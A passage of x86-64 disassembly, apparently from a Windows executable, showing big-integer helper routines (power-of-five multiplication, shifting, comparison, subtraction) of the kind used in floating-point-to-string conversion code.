   140008b76:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140008b7a:	48 01 d0             	add    %rdx,%rax
   140008b7d:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140008b81:	eb 04                	jmp    0x140008b87
   140008b83:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
   140008b87:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   140008b8b:	7e 0f                	jle    0x140008b9c
   140008b8d:	48 83 6d e0 04       	subq   $0x4,-0x20(%rbp)
   140008b92:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008b96:	8b 00                	mov    (%rax),%eax
   140008b98:	85 c0                	test   %eax,%eax
   140008b9a:	74 e7                	je     0x140008b83
   140008b9c:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140008ba0:	8b 55 f8             	mov    -0x8(%rbp),%edx
   140008ba3:	89 50 14             	mov    %edx,0x14(%rax)
   140008ba6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140008baa:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140008bb1:	5d                   	pop    %rbp
   140008bb2:	c3                   	ret
   140008bb3:	55                   	push   %rbp
   140008bb4:	48 89 e5             	mov    %rsp,%rbp
   140008bb7:	48 83 ec 40          	sub    $0x40,%rsp
   140008bbb:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008bbf:	89 55 18             	mov    %edx,0x18(%rbp)
   140008bc2:	8b 45 18             	mov    0x18(%rbp),%eax
   140008bc5:	83 e0 03             	and    $0x3,%eax
   140008bc8:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140008bcb:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140008bcf:	74 41                	je     0x140008c12
   140008bd1:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140008bd4:	83 e8 01             	sub    $0x1,%eax
   140008bd7:	48 98                	cltq
   140008bd9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008be0:	00 
   140008be1:	48 8d 05 b0 24 00 00 	lea    0x24b0(%rip),%rax        # 0x14000b098
   140008be8:	8b 14 02             	mov    (%rdx,%rax,1),%edx
   140008beb:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008bef:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   140008bf5:	48 89 c1             	mov    %rax,%rcx
   140008bf8:	e8 1c fc ff ff       	call   0x140008819
   140008bfd:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140008c01:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   140008c06:	75 0a                	jne    0x140008c12
   140008c08:	b8 00 00 00 00       	mov    $0x0,%eax
   140008c0d:	e9 58 01 00 00       	jmp    0x140008d6a
   140008c12:	c1 7d 18 02          	sarl   $0x2,0x18(%rbp)
   140008c16:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   140008c1a:	75 09                	jne    0x140008c25
   140008c1c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008c20:	e9 45 01 00 00       	jmp    0x140008d6a
   140008c25:	48 8b 05 54 8f 00 00 	mov    0x8f54(%rip),%rax        # 0x140011b80
   140008c2c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008c30:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008c35:	75 5e                	jne    0x140008c95
   140008c37:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008c3c:	e8 51 f8 ff ff       	call   0x140008492
   140008c41:	48 8b 05 38 8f 00 00 	mov    0x8f38(%rip),%rax        # 0x140011b80
   140008c48:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008c4c:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008c51:	75 38                	jne    0x140008c8b
   140008c53:	b9 71 02 00 00       	mov    $0x271,%ecx
   140008c58:	e8 ea fc ff ff       	call   0x140008947
   140008c5d:	48 89 05 1c 8f 00 00 	mov    %rax,0x8f1c(%rip)        # 0x140011b80
   140008c64:	48 8b 05 15 8f 00 00 	mov    0x8f15(%rip),%rax        # 0x140011b80
   140008c6b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008c6f:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008c74:	75 0a                	jne    0x140008c80
   140008c76:	b8 00 00 00 00       	mov    $0x0,%eax
   140008c7b:	e9 ea 00 00 00       	jmp    0x140008d6a
   140008c80:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008c84:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140008c8b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008c90:	e8 2f f9 ff ff       	call   0x1400085c4
   140008c95:	8b 45 18             	mov    0x18(%rbp),%eax
   140008c98:	83 e0 01             	and    $0x1,%eax
   140008c9b:	85 c0                	test   %eax,%eax
   140008c9d:	74 39                	je     0x140008cd8
   140008c9f:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140008ca3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008ca7:	48 89 c1             	mov    %rax,%rcx
   140008caa:	e8 de fc ff ff       	call   0x14000898d
   140008caf:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140008cb3:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
   140008cb8:	75 0a                	jne    0x140008cc4
   140008cba:	b8 00 00 00 00       	mov    $0x0,%eax
   140008cbf:	e9 a6 00 00 00       	jmp    0x140008d6a
   140008cc4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008cc8:	48 89 c1             	mov    %rax,%rcx
   140008ccb:	e8 be fa ff ff       	call   0x14000878e
   140008cd0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008cd4:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140008cd8:	d1 7d 18             	sarl   $1,0x18(%rbp)
   140008cdb:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   140008cdf:	0f 84 80 00 00 00    	je     0x140008d65
   140008ce5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008ce9:	48 8b 00             	mov    (%rax),%rax
   140008cec:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008cf0:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140008cf5:	75 61                	jne    0x140008d58
   140008cf7:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008cfc:	e8 91 f7 ff ff       	call   0x140008492
   140008d01:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008d05:	48 8b 00             	mov    (%rax),%rax
   140008d08:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008d0c:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140008d11:	75 3b                	jne    0x140008d4e
   140008d13:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140008d17:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008d1b:	48 89 c1             	mov    %rax,%rcx
   140008d1e:	e8 6a fc ff ff       	call   0x14000898d
   140008d23:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140008d27:	48 89 02             	mov    %rax,(%rdx)
   140008d2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008d2e:	48 8b 00             	mov    (%rax),%rax
   140008d31:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008d35:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140008d3a:	75 07                	jne    0x140008d43
   140008d3c:	b8 00 00 00 00       	mov    $0x0,%eax
   140008d41:	eb 27                	jmp    0x140008d6a
   140008d43:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008d47:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   140008d4e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008d53:	e8 6c f8 ff ff       	call   0x1400085c4
   140008d58:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008d5c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008d60:	e9 30 ff ff ff       	jmp    0x140008c95
   140008d65:	90                   	nop
   140008d66:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008d6a:	48 83 c4 40          	add    $0x40,%rsp
   140008d6e:	5d                   	pop    %rbp
   140008d6f:	c3                   	ret
   140008d70:	55                   	push   %rbp
   140008d71:	48 89 e5             	mov    %rsp,%rbp
   140008d74:	48 83 ec 60          	sub    $0x60,%rsp
   140008d78:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008d7c:	89 55 18             	mov    %edx,0x18(%rbp)
   140008d7f:	8b 45 18             	mov    0x18(%rbp),%eax
   140008d82:	c1 f8 05             	sar    $0x5,%eax
   140008d85:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140008d88:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008d8c:	8b 40 08             	mov    0x8(%rax),%eax
   140008d8f:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140008d92:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008d96:	8b 50 14             	mov    0x14(%rax),%edx
   140008d99:	8b 45 d8             	mov    -0x28(%rbp),%eax
   140008d9c:	01 d0                	add    %edx,%eax
   140008d9e:	83 c0 01             	add    $0x1,%eax
   140008da1:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140008da4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008da8:	8b 40 0c             	mov    0xc(%rax),%eax
   140008dab:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140008dae:	eb 07                	jmp    0x140008db7
   140008db0:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
   140008db4:	d1 65 fc             	shll   $1,-0x4(%rbp)
   140008db7:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140008dba:	3b 45 fc             	cmp    -0x4(%rbp),%eax
   140008dbd:	7f f1                	jg     0x140008db0
   140008dbf:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140008dc2:	89 c1                	mov    %eax,%ecx
   140008dc4:	e8 84 f8 ff ff       	call   0x14000864d
   140008dc9:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140008dcd:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
   140008dd2:	75 0a                	jne    0x140008dde
   140008dd4:	b8 00 00 00 00       	mov    $0x0,%eax
   140008dd9:	e9 19 01 00 00       	jmp    0x140008ef7
   140008dde:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008de2:	48 83 c0 18          	add    $0x18,%rax
   140008de6:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140008dea:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140008df1:	eb 16                	jmp    0x140008e09
   140008df3:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008df7:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008dfb:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   140008dff:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140008e05:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140008e09:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008e0c:	3b 45 d8             	cmp    -0x28(%rbp),%eax
   140008e0f:	7c e2                	jl     0x140008df3
   140008e11:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008e15:	48 83 c0 18          	add    $0x18,%rax
   140008e19:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140008e1d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008e21:	8b 40 14             	mov    0x14(%rax),%eax
   140008e24:	48 98                	cltq
   140008e26:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008e2d:	00 
   140008e2e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008e32:	48 01 d0             	add    %rdx,%rax
   140008e35:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140008e39:	83 65 18 1f          	andl   $0x1f,0x18(%rbp)
   140008e3d:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   140008e41:	74 71                	je     0x140008eb4
   140008e43:	b8 20 00 00 00       	mov    $0x20,%eax
   140008e48:	2b 45 18             	sub    0x18(%rbp),%eax
   140008e4b:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140008e4e:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
   140008e55:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008e59:	8b 10                	mov    (%rax),%edx
   140008e5b:	8b 45 18             	mov    0x18(%rbp),%eax
   140008e5e:	89 c1                	mov    %eax,%ecx
   140008e60:	d3 e2                	shl    %cl,%edx
   140008e62:	89 d1                	mov    %edx,%ecx
   140008e64:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008e68:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008e6c:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   140008e70:	0b 4d dc             	or     -0x24(%rbp),%ecx
   140008e73:	89 ca                	mov    %ecx,%edx
   140008e75:	89 10                	mov    %edx,(%rax)
   140008e77:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008e7b:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008e7f:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
   140008e83:	8b 10                	mov    (%rax),%edx
   140008e85:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140008e88:	89 c1                	mov    %eax,%ecx
   140008e8a:	d3 ea                	shr    %cl,%edx
   140008e8c:	89 d0                	mov    %edx,%eax
   140008e8e:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140008e91:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008e95:	48 3b 45 c8          	cmp    -0x38(%rbp),%rax
   140008e99:	72 ba                	jb     0x140008e55
   140008e9b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008e9f:	8b 55 dc             	mov    -0x24(%rbp),%edx
   140008ea2:	89 10                	mov    %edx,(%rax)
   140008ea4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008ea8:	8b 00                	mov    (%rax),%eax
   140008eaa:	85 c0                	test   %eax,%eax
   140008eac:	74 2c                	je     0x140008eda
   140008eae:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
   140008eb2:	eb 26                	jmp    0x140008eda
   140008eb4:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140008eb8:	48 8d 42 04          	lea    0x4(%rdx),%rax
   140008ebc:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140008ec0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008ec4:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140008ec8:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140008ecc:	8b 12                	mov    (%rdx),%edx
   140008ece:	89 10                	mov    %edx,(%rax)
   140008ed0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008ed4:	48 3b 45 c8          	cmp    -0x38(%rbp),%rax
   140008ed8:	72 da                	jb     0x140008eb4
   140008eda:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140008edd:	8d 50 ff             	lea    -0x1(%rax),%edx
   140008ee0:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008ee4:	89 50 14             	mov    %edx,0x14(%rax)
   140008ee7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008eeb:	48 89 c1             	mov    %rax,%rcx
   140008eee:	e8 9b f8 ff ff       	call   0x14000878e
   140008ef3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008ef7:	48 83 c4 60          	add    $0x60,%rsp
   140008efb:	5d                   	pop    %rbp
   140008efc:	c3                   	ret
   140008efd:	55                   	push   %rbp
   140008efe:	48 89 e5             	mov    %rsp,%rbp
   140008f01:	48 83 ec 30          	sub    $0x30,%rsp
   140008f05:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008f09:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140008f0d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008f11:	8b 40 14             	mov    0x14(%rax),%eax
   140008f14:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140008f17:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140008f1b:	8b 40 14             	mov    0x14(%rax),%eax
   140008f1e:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140008f21:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140008f24:	29 45 ec             	sub    %eax,-0x14(%rbp)
   140008f27:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
   140008f2b:	74 08                	je     0x140008f35
   140008f2d:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140008f30:	e9 92 00 00 00       	jmp    0x140008fc7
   140008f35:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008f39:	48 83 c0 18          	add    $0x18,%rax
   140008f3d:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140008f41:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140008f44:	48 98                	cltq
   140008f46:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008f4d:	00 
   140008f4e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008f52:	48 01 d0             	add    %rdx,%rax
   140008f55:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008f59:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140008f5d:	48 83 c0 18          	add    $0x18,%rax
   140008f61:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140008f65:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140008f68:	48 98                	cltq
   140008f6a:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008f71:	00 
   140008f72:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140008f76:	48 01 d0             	add    %rdx,%rax
   140008f79:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008f7d:	48 83 6d f8 04       	subq   $0x4,-0x8(%rbp)
   140008f82:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008f86:	8b 10                	mov    (%rax),%edx
   140008f88:	48 83 6d f0 04       	subq   $0x4,-0x10(%rbp)
   140008f8d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008f91:	8b 00                	mov    (%rax),%eax
   140008f93:	39 c2                	cmp    %eax,%edx
   140008f95:	74 1e                	je     0x140008fb5
   140008f97:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008f9b:	8b 10                	mov    (%rax),%edx
   140008f9d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008fa1:	8b 00                	mov    (%rax),%eax
   140008fa3:	39 c2                	cmp    %eax,%edx
   140008fa5:	73 07                	jae    0x140008fae
   140008fa7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140008fac:	eb 19                	jmp    0x140008fc7
   140008fae:	b8 01 00 00 00       	mov    $0x1,%eax
   140008fb3:	eb 12                	jmp    0x140008fc7
   140008fb5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008fb9:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   140008fbd:	73 02                	jae    0x140008fc1
   140008fbf:	eb bc                	jmp    0x140008f7d
   140008fc1:	90                   	nop
   140008fc2:	b8 00 00 00 00       	mov    $0x0,%eax
   140008fc7:	48 83 c4 30          	add    $0x30,%rsp
   140008fcb:	5d                   	pop    %rbp
   140008fcc:	c3                   	ret
   140008fcd:	55                   	push   %rbp
   140008fce:	48 89 e5             	mov    %rsp,%rbp
   140008fd1:	48 83 ec 70          	sub    $0x70,%rsp
   140008fd5:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008fd9:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140008fdd:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140008fe1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008fe5:	48 89 c1             	mov    %rax,%rcx
   140008fe8:	e8 10 ff ff ff       	call   0x140008efd
   140008fed:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140008ff0:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140008ff4:	75 3e                	jne    0x140009034
   140008ff6:	b9 00 00 00 00       	mov    $0x0,%ecx
   140008ffb:	e8 4d f6 ff ff       	call   0x14000864d
   140009000:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140009004:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
   140009009:	75 0a                	jne    0x140009015
   14000900b:	b8 00 00 00 00       	mov    $0x0,%eax
   140009010:	e9 ab 01 00 00       	jmp    0x1400091c0
   140009015:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140009019:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   140009020:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140009024:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%rax)
   14000902b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000902f:	e9 8c 01 00 00       	jmp    0x1400091c0
   140009034:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140009038:	79 21                	jns    0x14000905b
   14000903a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000903e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140009042:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009046:	48 89 45 10          	mov    %rax,0x10(%rbp)
   14000904a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   14000904e:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140009052:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   140009059:	eb 07                	jmp    0x140009062
   14000905b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140009062:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009066:	8b 40 08             	mov    0x8(%rax),%eax
   140009069:	89 c1                	mov    %eax,%ecx
   14000906b:	e8 dd f5 ff ff       	call   0x14000864d
   140009070:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140009074:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
   140009079:	75 0a                	jne    0x140009085
   14000907b:	b8 00 00 00 00       	mov    $0x0,%eax
   140009080:	e9 3b 01 00 00       	jmp    0x1400091c0
   140009085:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140009089:	8b 55 fc             	mov    -0x4(%rbp),%edx
   14000908c:	89 50 10             	mov    %edx,0x10(%rax)
   14000908f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009093:	8b 40 14             	mov    0x14(%rax),%eax
   140009096:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140009099:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000909d:	48 83 c0 18          	add    $0x18,%rax
   1400090a1:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400090a5:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400090a8:	48 98                	cltq
   1400090aa:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   1400090b1:	00 
   1400090b2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400090b6:	48 01 d0             	add    %rdx,%rax
   1400090b9:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400090bd:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400090c1:	8b 40 14             	mov    0x14(%rax),%eax
   1400090c4:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   1400090c7:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400090cb:	48 83 c0 18          	add    $0x18,%rax
   1400090cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400090d3:	8b 45 c4             	mov    -0x3c(%rbp),%eax
   1400090d6:	48 98                	cltq
   1400090d8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   1400090df:	00 
   1400090e0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400090e4:	48 01 d0             	add    %rdx,%rax
   1400090e7:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   1400090eb:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400090ef:	48 83 c0 18          	add    $0x18,%rax
   1400090f3:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400090f7:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
   1400090fe:	00 
   1400090ff:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009103:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140009107:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   14000910b:	8b 00                	mov    (%rax),%eax
   14000910d:	89 c1                	mov    %eax,%ecx
   14000910f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140009113:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140009117:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
   14000911b:	8b 00                	mov    (%rax),%eax
   14000911d:	89 c2                	mov    %eax,%edx
   14000911f:	48 89 c8             	mov    %rcx,%rax
   140009122:	48 29 d0             	sub    %rdx,%rax
   140009125:	48 2b 45 d8          	sub    -0x28(%rbp),%rax
   140009129:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   14000912d:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140009131:	48 c1 e8 20          	shr    $0x20,%rax
   140009135:	83 e0 01             	and    $0x1,%eax
   140009138:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000913c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140009140:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140009144:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   140009148:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   14000914c:	89 10                	mov    %edx,(%rax)
   14000914e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140009152:	48 3b 45 b8          	cmp    -0x48(%rbp),%rax
   140009156:	72 a7                	jb     0x1400090ff
   140009158:	eb 39                	jmp    0x140009193
   14000915a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000915e:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140009162:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140009166:	8b 00                	mov    (%rax),%eax
   140009168:	89 c0                	mov    %eax,%eax
   14000916a:	48 2b 45 d8          	sub    -0x28(%rbp),%rax
   14000916e:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140009172:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
   140009176:	48 c1 e8 20          	shr    $0x20,%rax
   14000917a:	83 e0 01             	and    $0x1,%eax
   14000917d:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140009181:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140009185:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140009189:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   14000918d:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140009191:	89 10                	mov    %edx,(%rax)
   140009193:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009197:	48 3b 45 c8          	cmp    -0x38(%rbp),%rax
   14000919b:	72 bd                	jb     0x14000915a
   14000919d:	eb 04                	jmp    0x1400091a3
   14000919f:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
   1400091a3:	48 83 6d e0 04       	subq   $0x4,-0x20(%rbp)
   1400091a8:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400091ac:	8b 00                	mov    (%rax),%eax
   1400091ae:	85 c0                	test   %eax,%eax
   1400091b0:	74 ed                	je     0x14000919f
   1400091b2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400091b6:	8b 55 f8             	mov    -0x8(%rbp),%edx
   1400091b9:	89 50 14             	mov    %edx,0x14(%rax)
   1400091bc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400091c0:	48 83 c4 70          	add    $0x70,%rsp
   1400091c4:	5d                   	pop    %rbp
   1400091c5:	c3                   	ret
   1400091c6:	55                   	push   %rbp
   1400091c7:	48 89 e5             	mov    %rsp,%rbp
   1400091ca:	48 83 ec 50          	sub    $0x50,%rsp
   1400091ce:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400091d2:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400091d6:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400091da:	48 83 c0 18          	add    $0x18,%rax
   1400091de:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400091e2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400091e6:	8b 40 14             	mov    0x14(%rax),%eax
   1400091e9:	48 98                	cltq
   1400091eb:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   1400091f2:	00 
   1400091f3:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400091f7:	48 01 d0             	add    %rdx,%rax
   1400091fa:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400091fe:	48 83 6d f8 04       	subq   $0x4,-0x8(%rbp)
   140009203:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009207:	8b 00                	mov    (%rax),%eax
   140009209:	89 45 f0             	mov    %eax,-0x10(%rbp)
   14000920c:	8b 45 f0             	mov    -0x10(%rbp),%eax
   14000920f:	89 c1                	mov    %eax,%ecx
   140009211:	e8 27 f4 ff ff       	call   0x14000863d
   140009216:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140009219:	b8 20 00 00 00       	mov    $0x20,%eax
   14000921e:	2b 45 dc             	sub    -0x24(%rbp),%eax
   140009221:	89 c2                	mov    %eax,%edx
   140009223:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009227:	89 10                	mov    %edx,(%rax)
